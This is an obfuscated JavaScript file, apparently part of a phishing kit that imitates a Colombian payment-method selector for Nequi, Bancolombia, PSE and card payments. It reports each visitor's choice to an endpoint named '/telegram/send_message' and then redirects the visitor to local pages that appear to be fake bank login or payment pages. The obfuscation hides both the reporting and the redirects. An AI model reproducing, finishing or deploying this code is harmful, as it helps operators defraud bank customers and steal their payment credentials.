const _0x5d419c = _0x4217;
(function (_0x360f69, _0x4b7482) {
  const _0x4fc514 = _0x4217,
    _0x49ccca = _0x360f69();
  while (!![]) {
    try {
      const _0x1f77ef =
        (parseInt(_0x4fc514(0x1ae)) / 0x1) *
          (parseInt(_0x4fc514(0x198)) / 0x2) +
        (parseInt(_0x4fc514(0x1b5)) / 0x3) *
          (-parseInt(_0x4fc514(0x197)) / 0x4) +
        (-parseInt(_0x4fc514(0x1b8)) / 0x5) *
          (parseInt(_0x4fc514(0x1ca)) / 0x6) +
        parseInt(_0x4fc514(0x1a3)) / 0x7 +
        parseInt(_0x4fc514(0x1be)) / 0x8 +
        parseInt(_0x4fc514(0x199)) / 0x9 +
        (-parseInt(_0x4fc514(0x1cd)) / 0xa) *
          (parseInt(_0x4fc514(0x1a7)) / 0xb);
      if (_0x1f77ef === _0x4b7482) break;
      else _0x49ccca["push"](_0x49ccca["shift"]());
    } catch (_0x5b059c) {
      _0x49ccca["push"](_0x49ccca["shift"]());
    }
  }
})(_0x2d5b, 0x2537a),
  document[_0x5d419c(0x1cb)](_0x5d419c(0x19e))["addEventListener"](
    _0x5d419c(0x195),
    function () {
      const _0x271f7b = _0x5d419c;
      this[_0x271f7b(0x1b1)][_0x271f7b(0x1bd)](_0x271f7b(0x1c5));
    }
  );
const opciones = document[_0x5d419c(0x1a1)](_0x5d419c(0x196));
function _0x4217(_0x4b9900, _0x2df59b) {
  const _0x2d5b69 = _0x2d5b();
  return (
    (_0x4217 = function (_0x42171d, _0x4d6b95) {
      _0x42171d = _0x42171d - 0x195;
      let _0x7f4da3 = _0x2d5b69[_0x42171d];
      return _0x7f4da3;
    }),
    _0x4217(_0x4b9900, _0x2df59b)
  );
}
let selectedOption = null;
opciones[_0x5d419c(0x1c1)]((_0x118531) => {
  const _0x3c76c6 = _0x5d419c;
  _0x118531[_0x3c76c6(0x1a0)](_0x3c76c6(0x195), function (_0x271e8a) {
    const _0x52f89e = _0x3c76c6,
      _0x35b11f = document[_0x52f89e(0x1b6)](_0x52f89e(0x19c)),
      _0x41ec77 = this[_0x52f89e(0x1b6)]("img")["src"],
      _0x57ef53 = this[_0x52f89e(0x1b6)](_0x52f89e(0x1b4))["textContent"];
    (_0x35b11f["innerHTML"] =
      _0x52f89e(0x1c7) +
      _0x41ec77 +
      _0x52f89e(0x1af) +
      _0x57ef53 +
      _0x52f89e(0x1bf)),
      document[_0x52f89e(0x1cb)]("select")[_0x52f89e(0x1b1)][_0x52f89e(0x1c9)](
        _0x52f89e(0x1c5)
      );
    const _0x46a9c4 = document["getElementById"]("nextStep");
    (_0x46a9c4["disabled"] = ![]),
      _0x46a9c4[_0x52f89e(0x1b1)][_0x52f89e(0x1bb)](_0x52f89e(0x1ad)),
      (selectedOption = _0x41ec77[_0x52f89e(0x1c4)]("/")["pop"]()),
      console[_0x52f89e(0x19d)](selectedOption),
      _0x271e8a[_0x52f89e(0x1a2)]();
  });
}),
  document[_0x5d419c(0x1cb)]("nextStep")[_0x5d419c(0x1a0)](
    _0x5d419c(0x195),
    async function () {
      const _0x1229ac = _0x5d419c;
      if (!selectedOption) {
        alert(_0x1229ac(0x1a9));
        return;
      }
      let _0x176907;
      switch (selectedOption) {
        case _0x1229ac(0x1b0):
          _0x176907 = _0x1229ac(0x1ba);
          break;
        case _0x1229ac(0x1c8):
          _0x176907 = "🟡\x20Bancolombia";
          break;
        case _0x1229ac(0x1b2):
          _0x176907 = _0x1229ac(0x1b3);
          break;
        case "pse.png":
          _0x176907 = "🟣\x20PSE";
          break;
        default:
          alert(_0x1229ac(0x1a4));
          return;
      }
      document["getElementById"](_0x1229ac(0x1a8))[_0x1229ac(0x1cc)][
        _0x1229ac(0x1c2)
      ] = _0x1229ac(0x19f);
      try {
        const _0x29cb13 = await fetch(url + _0x1229ac(0x1c0), {
          method: _0x1229ac(0x19a),
          headers: { "Content-Type": _0x1229ac(0x1a5) },
          body: JSON["stringify"]({ message: _0x176907 }),
        });
        if (!_0x29cb13["ok"]) {
          console[_0x1229ac(0x19b)](
            "Error\x20al\x20procesar\x20la\x20opción\x20seleccionada:",
            await _0x29cb13["json"]()
          ),
            alert(_0x1229ac(0x1aa));
          return;
        }
        setTimeout(() => {
          const _0xc4b79a = _0x1229ac;
          switch (selectedOption) {
            case _0xc4b79a(0x1b0):
              window[_0xc4b79a(0x1b9)]["href"] = _0xc4b79a(0x1a6);
              break;
            case _0xc4b79a(0x1c8):
              window[_0xc4b79a(0x1b9)][_0xc4b79a(0x1c3)] = _0xc4b79a(0x1ac);
              break;
            case _0xc4b79a(0x1b2):
              window[_0xc4b79a(0x1b9)]["href"] = "./tc.html";
              break;
            case _0xc4b79a(0x1c6):
              window[_0xc4b79a(0x1b9)][_0xc4b79a(0x1c3)] = _0xc4b79a(0x1bc);
              break;
          }
        }, 0x64);
      } catch (_0x69286c) {
        console[_0x1229ac(0x19b)](_0x1229ac(0x1b7), _0x69286c),
          alert(_0x1229ac(0x1ab));
      } finally {
        document[_0x1229ac(0x1cb)]("loader-container")[_0x1229ac(0x1cc)][
          "display"
        ] = "none";
      }
    }
  );
function _0x2d5b() {
  const _0x4874bf = [
    "🔵\x20Nequi",
    "add",
    "./ps.html",
    "toggle",
    "2031880qCnonF",
    "</span>",
    "/telegram/send_message",
    "forEach",
    "display",
    "href",
    "split",
    "active",
    "pse.png",
    "<img\x20src=\x22",
    "bancolombia.png",
    "remove",
    "36258AUBVxp",
    "getElementById",
    "style",
    "3350220saWOvD",
    "click",
    ".opcion",
    "24kllgkm",
    "3258qkOtwV",
    "477990LmBomj",
    "POST",
    "error",
    ".contenido-select",
    "log",
    "select",
    "flex",
    "addEventListener",
    "querySelectorAll",
    "stopPropagation",
    "1434671vrqbAn",
    "Opción\x20no\x20válida\x20seleccionada.",
    "application/json",
    "./points/nequi/rastrear/index.html",
    "11wDaeas",
    "loader-container",
    "Por\x20favor\x20selecciona\x20una\x20opción\x20antes\x20de\x20continuar.",
    "Hubo\x20un\x20problema\x20al\x20procesar\x20tu\x20solicitud.\x20Intenta\x20nuevamente.",
    "Ocurrió\x20un\x20error\x20inesperado.\x20Intenta\x20nuevamente.",
    "./points/trico/home.html",
    "btn-enabled",
    "123qBVhlL",
    "\x22\x20alt=\x22icono\x22\x20class=\x22icono-seleccionado\x22>\x20<span>",
    "NEQ.png",
    "classList",
    "FORMA_PAGO_2.png",
    "🟢\x20Tarjeta",
    "span",
    "42981JyOTpH",
    "querySelector",
    "Error\x20al\x20comunicarse\x20con\x20la\x20API:",
    "115JKxWXP",
    "location",
  ];
  _0x2d5b = function () {
    return _0x4874bf;
  };
  return _0x2d5b();
}
